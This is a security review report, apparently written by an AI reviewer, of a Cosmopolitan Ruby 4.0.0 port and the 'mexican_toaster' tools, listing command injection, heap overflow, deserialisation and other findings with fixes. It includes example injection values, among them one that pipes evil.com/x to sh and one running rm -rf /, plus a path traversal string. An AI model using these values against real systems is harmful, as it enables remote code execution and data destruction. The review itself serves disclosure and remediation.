# Security Review: CosmoRuby 4.0.0 & mexican_toaster

**Date:** 2026-03-07
**Reviewer:** Claude Opus 4.6 (6 parallel review agents)
**Scope:** `third_party/ruby-wip-4.0.0/` (Cosmopolitan-specific code + upstream Ruby high-risk areas) and `third_party/mexican_toaster/` (all code)

---

## Executive Summary

| Severity | Count | Breakdown |
|----------|-------|-----------|
| **High** | 6 | 2 command injection (mexican_toaster), 2 heap overflow (marshal.c), 1 regex OOB (regexec.c), 1 memory_view OOB (memory_view.c) |
| **Medium** | 13 | Buffer overflows, integer overflows, data races, ReDoS memory, weak entropy, TOML injection |
| **Low** | 14 | TOCTOU, static buffer reuse, lock ordering, resource exhaustion, etc. |
| **Informational** | 3 | Design-level (Marshal deser, SipHash-1-3, toolchain integrity) |

**Most actionable:** The 2 High-severity command injection findings in `automate_mkdeps.c` are in custom code we control and should be fixed. The upstream Ruby findings (marshal.c, regexec.c, memory_view.c) should be reported to Ruby upstream.

---

## HIGH Severity Findings

### H1. Command Injection via `system()`/`popen()` in automate_mkdeps.c

**File:** `third_party/build/mtdeps/automate_mkdeps.c`
**Lines:** 616-632, 910-911, 1198-1200, 1332-1343
**Class:** Command Injection

User-controllable values from `--module=` argument and `MKDEPS`/`MODE` environment variables are interpolated into shell commands via `snprintf` then passed to `system()` and `popen()` without escaping.

```c
// Line 624-626 - MKDEPS and MODE env vars injected into system()
snprintf(cmd, sizeof(cmd),
         "%s -P %s -o o/%sdepend -s -r o/%s @o/%ssrcs.txt ...",
         mkdeps, shim_prefix, o, o, o, o, o, outpath);
int rc = system(cmd);

// Line 910 - --module= argument injected into popen()
snprintf(cmd, sizeof(cmd), "PKG_CONFIG_PATH=%s pkg-config --cflags %s 2>/dev/null",
         dir, cfg->module_name);
FILE *fp = popen(cmd, "r");

// Line 1332 - build output basename injected into system()
snprintf(find_cmd, sizeof(find_cmd),
         "find %s -name '%s' -type f 2>/dev/null | head -10",
         cfg.search_dir, basename);
system(find_cmd);
```

**Impact:** `MKDEPS="x; rm -rf /; #"` or `--module="'; curl evil.com/x|sh; #"` would execute arbitrary commands.

**Fix:** Replace `system()`/`popen()` with `fork()`/`execvp()` (the pattern already used in `persist.inc`'s `RunCommand`), or sanitise inputs by rejecting shell metacharacters.

---

### H2. Heap Buffer Overflow in Marshal `r_byte1_buffered` / `r_bytes1_buffered`

**File:** `third_party/ruby-wip-4.0.0/marshal.c`
**Lines:** 1351, 1483-1486
**Class:** Heap Buffer Overflow

```c
// Line 1351 - read side
memcpy(arg->buf, RSTRING_PTR(str), RSTRING_LEN(str));

// Line 1483-1486 - write side
if (tmp_len > need_len) {
    buflen = tmp_len - need_len;
    memcpy(arg->buf, RSTRING_PTR(tmp)+need_len, buflen);
    arg->buflen = buflen;
}
```

`arg->buf` is allocated as `xmalloc(BUFSIZ)`. The `read` method is called on a user-supplied IO object. A malicious `read` implementation can return a string **longer** than `BUFSIZ`, and `RSTRING_LEN(str)` is used for the memcpy length, not the requested amount. The code only checks for `NIL_P(str)`, never verifying the returned length.

**Impact:** Heap buffer overflow when `Marshal.load` is called with a custom IO object.

**Fix:** Clamp `memcpy` length to `min(RSTRING_LEN(str), BUFSIZ)`.

**Note:** Upstream Ruby issue. Consider reporting.

---

### H3. Marshal Arbitrary Object Instantiation via `path2class`

**File:** `third_party/ruby-wip-4.0.0/marshal.c`
**Lines:** 1836-1838, 2182-2210, 2248, 2261
**Class:** Insecure Deserialisation

```c
VALUE klass = path2class(name);  // name from untrusted input
v = load_funcall(arg, klass, s_load, 1, &data);
```

`Marshal.load` resolves class names from untrusted input and calls `_load`/`marshal_load`/`_load_data` on them. Any class in the process with these methods can be instantiated with attacker-controlled data. This is the well-known Ruby Marshal deserialisation vulnerability family (CVE-2013-0156 etc.).

**Impact:** Remote code execution if `Marshal.load` is called on untrusted data.

**Note:** Design-level upstream issue. Ruby documents this in marshal.c lines 2469-2479. No allow-list mechanism exists.

---

### H4. Signed Integer Overflow in Regex Match Cache (regexec.c)

**File:** `third_party/ruby-wip-4.0.0/regexec.c`
**Line:** 2631
**Class:** Integer Overflow -> Heap OOB Read/Write

```c
long match_cache_point = msa->num_cache_points * (long)(s - str) + cache_point;
```

The multiplication `num_cache_points * (long)(s - str)` has no overflow check. While the allocation path (line 4170-4178) validates the size, the usage path does not. An overflowed `match_cache_point_index` enables out-of-bounds access on `msa->match_cache_buf`.

**Impact:** Heap OOB read/write via crafted regex + input string.

**Note:** Upstream Ruby/Oniguruma issue.

---

### H5. No Bounds Validation in `rb_memory_view_get_item_pointer`

**File:** `third_party/ruby-wip-4.0.0/memory_view.c`
**Lines:** 513-553
**Class:** Out-of-Bounds Read/Write

```c
void *
rb_memory_view_get_item_pointer(rb_memory_view_t *view, const ssize_t *indices)
{
    uint8_t *ptr = view->data;
    if (view->ndim == 1) {
        ssize_t stride = view->strides != NULL ? view->strides[0] : view->item_size;
        return ptr + indices[0] * stride;  // NO BOUNDS CHECK
    }
    // ... all paths lack bounds checks
```

No validation that `indices[i]` is within `[0, view->shape[i])`. Negative indices or out-of-range indices compute an OOB pointer. Reachable from Ruby-level memory view operations if C extension callers don't validate.

**Impact:** Arbitrary memory read/write depending on caller validation.

**Note:** Upstream Ruby issue.

---

## MEDIUM Severity Findings

### M1. Buffer Overflow in mtsh Tokeniser (unchecked `*q++` writes)

**File:** `third_party/mexican_toaster/mtsh/tokenize.inc`
**Lines:** 224, 290-295

Direct writes to `*q++` in `STATE_SINGLE` and `STATE_QUOTED` bypass the `Append()` bounds check. A long quoted string can overflow `argbuf[ARG_MAX]`. The backslash case writes 2 bytes without any check.

### M2. Glob Expansion Can Overflow Fixed `args` Array

**File:** `third_party/mexican_toaster/mtsh/entry.inc`
**Lines:** 124-127

The glob loop increments `n` for each expanded path but the bounds check only guards the token count, not the glob expansion count. A pattern like `/*/*/*` can exceed `ARRAYLEN(args)` (3000).

### M3. TOML Injection in Caboose State File

**File:** `third_party/mexican_toaster/caboose/inc/state_file.inc`
**Lines:** 210-213

Strings written to TOML state file are not escaped. A `binary_path` containing `"` or `\n` corrupts the TOML, potentially injecting arbitrary keys that influence mount/chroot operations.

### M4. Stack Overflow via Unbounded `alloca()` in io_buffer_hexdump

**File:** `third_party/ruby-wip-4.0.0/io_buffer.c`
**Line:** 1047

```c
char *text = alloca(width+1);
```

`width` from user input has only a minimum check (>=1). `alloca(0xFFFFFFFF)` corrupts the stack. `width+1` also wraps on 32-bit.

### M5. Integer Overflow in `io_buffer_hexdump_output_size`

**File:** `third_party/ruby-wip-4.0.0/io_buffer.c`
**Line:** 1033

`width*3` overflows when `width` is large, causing undersized buffer allocation.

### M6. No Recursion Depth Limit on `Marshal.load`

**File:** `third_party/ruby-wip-4.0.0/marshal.c`
**Lines:** 1886-1929

`r_object0` has no depth limit (unlike `w_object` for dump). Crafted stream with nested TYPE_ARRAY/TYPE_IVAR causes unbounded C-stack recursion -> crash.

### M7. Unvalidated Length Pre-allocation in Marshal

**File:** `third_party/ruby-wip-4.0.0/marshal.c`
**Lines:** 2092-2094

Array/hash length from untrusted stream passed directly to `rb_ary_new2`/`hash_new_with_size`. Values up to ~2^30 succeed allocation, wasting memory.

### M8. Data Race in `ractor_value` on `sync.legacy`

**File:** `third_party/ruby-wip-4.0.0/ractor_sync.c`
**Lines:** 762-779

`r->sync.legacy` and `r->sync.legacy_exc` read without holding the ractor lock. Written under lock in `ractor_notify_exit`. CAS on successor does not fence these reads.

### M9. Weak Entropy Fallback for SipHash Seeding

**File:** `third_party/ruby-wip-4.0.0/random.c`
**Lines:** 707-740, 1794-1814

When OS entropy fails (more likely on Cosmopolitan's bare metal/cross-platform targets), fallback uses time + PID + counter + stack address. Predictable SipHash key enables hash collision DoS.

### M10. Integer Overflow in Regex Cache Point Init

**File:** `third_party/ruby-wip-4.0.0/regexec.c`
**Line:** 740

Unchecked arithmetic on `cache_point` with nested high-count quantifiers can overflow, causing undersized cache buffer allocation.

### M11. Unchecked Integer Overflow in `stack_double`

**File:** `third_party/ruby-wip-4.0.0/regexec.c`
**Line:** 1239

`sizeof(OnigStackType) * n * 2` can overflow `size_t`. Code has a `/* TODO: check overflow */` comment. Default match stack limit is 0 (unlimited).

### M12. `BBUF_WRITE` Integer Truncation

**File:** `third_party/ruby-wip-4.0.0/regint.h`
**Line:** 487

`int used = (pos) + (int)(n)` truncates if inputs exceed `INT_MAX`, skipping bounds check -> OOB write.

### M13. Integer Overflow in memory_view Format Count Parsing

**File:** `third_party/ruby-wip-4.0.0/memory_view.c`
**Lines:** 291-297

Count accumulation `n = 10*n + digit` has no overflow check. Overflows `ssize_t`, leading to undersized allocation.

---

## LOW Severity Findings

| # | File | Line(s) | Issue |
|---|------|---------|-------|
| L1 | mexican_toaster/caboose/zip_tools.inc | 81 | Path traversal in CatFile (`/zip/../../etc/passwd`) |
| L2 | mexican_toaster/caboose/persist.inc | 26, 56 | Static buffer reuse in ExtractZipTool/FindTool |
| L3 | mexican_toaster/mtsh/util.inc | 580-588 | TOCTOU in `Rm()` (lstat/access then unlink) |
| L4 | mexican_toaster/caboose/env_probe.inc | 15-29 | GrepFile misses matches spanning 512-byte read boundaries |
| L5 | ruby-wip-4.0.0/ruby_cosmo_main.h | 78-100 | setenv/free ordering (safe on Cosmo, portability hazard) |
| L6 | ruby-wip-4.0.0/io_buffer.c | 1457-1474 | `IO::Buffer#locked` doesn't unlock on exception |
| L7 | ruby-wip-4.0.0/signal.c | 1027 | Non-async-signal-safe calls in signal handler (GET_VM, rb_gc_disable) |
| L8 | ruby-wip-4.0.0/marshal.c | 2114, 2148 | Integer overflow in `readable` tracking |
| L9 | ruby-wip-4.0.0/marshal.c | 2036 | Integer overflow in bignum `len * 2` |
| L10 | ruby-wip-4.0.0/ractor_sync.c | 740-749 | Non-atomic read in `ractor_set_successor_once` |
| L11 | ruby-wip-4.0.0/ractor_sync.c | 55-60 | Non-atomic port ID generation |
| L12 | ruby-wip-4.0.0/thread_pthread.c | 1068-1090 | Lock ordering in `ubf_waiting` (fragile but currently safe) |
| L13 | ruby-wip-4.0.0/ractor_sync.c | 616-648 | Lockless monitor iteration at exit (potential UAF) |
| L14 | ruby-wip-4.0.0/thread.c, ractor.c | 896, 362-369 | No resource limit on thread/ractor creation |

---

## Positive Findings (Things Done Right)

- **Null byte injection protection** in `file.c` (line 248-249) -- paths with embedded nulls are correctly rejected
- **FD close-on-exec handling** in `io.c` (lines 275-290) -- `O_CLOEXEC` used consistently with fallback to `fcntl`
- **Shell metacharacter detection** in `process.c` (line 2550) -- comprehensive check before routing to `sh -c`
- **Temp file handling** in shell scripts -- `mktemp` + `trap` cleanup used correctly
- **Shell quoting** in cosmo scripts -- variables generally well-quoted, `<<'EOF'` used to prevent interpolation

---

## Recommendations

### Immediate (Our Code - mexican_toaster)

1. **Fix H1:** Replace `system()`/`popen()` with `fork()`/`execvp()` in `automate_mkdeps.c`, or add strict input validation rejecting shell metacharacters
2. **Fix M1:** Route all tokeniser writes through `Append()` bounds-checked function
3. **Fix M2:** Add bounds check inside glob expansion loop in `entry.inc`
4. **Fix M3:** Escape TOML string values in `state_file.inc`

### Consider Reporting Upstream (Ruby)

1. **H2:** marshal.c heap overflow via malicious IO `read` returning oversized data
2. **H4:** regexec.c signed integer overflow in match cache point calculation
3. **H5:** memory_view.c missing bounds validation in `get_item_pointer`
4. **M6:** Marshal.load missing recursion depth limit

### Cosmopolitan-Specific Concern

- **M9:** The weak entropy fallback is more likely to be hit on Cosmopolitan targets (bare metal, exotic OS). Consider adding a Cosmopolitan-specific entropy source (e.g., `rdrand` on x86) as a fallback before the time+PID method.
